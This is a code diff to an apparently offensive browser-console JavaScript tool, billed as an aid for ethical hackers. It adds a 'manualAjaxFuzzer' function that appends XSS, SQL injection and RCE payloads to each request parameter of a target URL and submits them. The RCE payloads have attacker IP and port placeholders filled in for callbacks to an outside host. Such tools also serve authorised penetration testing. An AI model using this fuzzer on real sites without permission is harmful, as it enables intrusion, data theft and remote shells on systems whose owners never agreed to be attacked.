@@ -3,6 +3,7 @@
 // You'll find interesting functions and some bugs
 
 // linkedin: https://www.linkedin.com/in/davidecavallini/
+// eslint-disable-next-line no-unused-vars
 
 // This tool is studied to help Ethical Hackers to find vulnerable points in webpage's javascript
 // Just open the webpage, select all this code, copy and past in browser's console
@@ -55,6 +56,13 @@ function JsBugHuntingHelper () {
     this.attackerIp = attackerIp
     this.attackerPort = attackerPort
 
+    // console.log(window.wrappedJSObject)
+
+    window.wrappedJSObject !== undefined ? this.originalWinObj = window.wrappedJSObject : this.originalWinObj = window
+
+    // to do
+    // window.wrappedJSObject.manualAjaxFuzzer = this.manualAjaxFuzzer
+
     console.log('Created by Davide Cavallini')
     console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/')
     console.log('----------------------------------------------------------')
@@ -66,10 +74,6 @@ function JsBugHuntingHelper () {
     console.log('\n')
 
     console.log('Window Memory Suspicious Points'.toUpperCase())
-
-    // console.log(window.wrappedJSObject)
-
-    window.wrappedJSObject !== undefined ? this.originalWinObj = window.wrappedJSObject : this.originalWinObj = window
 
     recursiveEnumerate(this.originalWinObj, 0).forEach((v) => {
       console.log(v.description, v.function, v.declaration)
@@ -586,6 +590,107 @@ function JsBugHuntingHelper () {
       root = document
     }
     return root.querySelectorAll(selector)
+  }
+
+  /* example of paramsObject */
+  /*
+  { a: 1,b:3}
+  */
+  this.manualAjaxFuzzer = async function (url, method, paramsObject) {
+    const result = []
+
+    const params2 = Object.entries(paramsObject)
+
+    console.log(params2)
+
+    const originalParamsLength = params2.length
+
+    if (this.xssScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+      // console.log(params2[i])
+
+        for (const payload of payloadsXSS) {
+        // console.log(payload)
+
+          const tempParams = []
+
+          for (let i = 0; i < originalParamsLength; i++) {
+            const tagName = params2[i][0]
+            const value = params2[i][1]
+
+            tempParams.push({ name: tagName, value })
+          }
+          // console.log(tempParams, i, tempParams.length, tempParams[i])
+
+          if (tempParams[i] !== undefined) {
+            tempParams[i].value += payload
+
+            const form = document.createElement('form')
+            form.method = method
+            form.action = url
+            result.push(await sendFormRequest.call(this, form, tempParams, 'XSS', tempParams[i].name))
+          }
+        }
+      }
+    }
+
+    if (this.sqlInjectionScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsSQLi) {
+        // console.log(payload)
+
+          const tempParams = []
+
+          for (let i = 0; i < originalParamsLength; i++) {
+            const tagName = params2[i][0]
+            const value = params2[i][1]
+
+            tempParams.push({ name: tagName, value })
+          }
+          // console.log(tempParams, i, tempParams.length, tempParams[i])
+
+          if (tempParams[i] !== undefined) {
+            tempParams[i].value += payload
+
+            const form = document.createElement('form')
+            form.method = method
+            form.action = url
+            result.push(await sendFormRequest.call(this, form, tempParams, 'SQLi', tempParams[i].name))
+          }
+        }
+      }
+    }
+
+    if (this.rceScanEnabled === true) {
+      for (let i = 0; i < originalParamsLength; i++) {
+        for (const payload of payloadsRCE) {
+        // console.log(payload)
+
+          const tempParams = []
+
+          for (let i = 0; i < originalParamsLength; i++) {
+            const tagName = params2[i][0]
+            const value = params2[i][1]
+
+            tempParams.push({ name: tagName, value })
+          }
+          // console.log(tempParams, i, tempParams.length, tempParams[i])
+
+          if (tempParams[i] !== undefined) {
+            tempParams[i].value += payload.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort)
+
+            const form = document.createElement('form')
+            form.method = method
+            form.action = url
+            result.push(await sendFormRequest.call(this, form, tempParams, 'RCE', tempParams[i].name))
+          }
+        }
+
+      // console.log(result)
+      }
+    }
+
+    return result.filter((v) => v.paramName !== undefined)
   }
 
   // fuzz all forms in the webpage
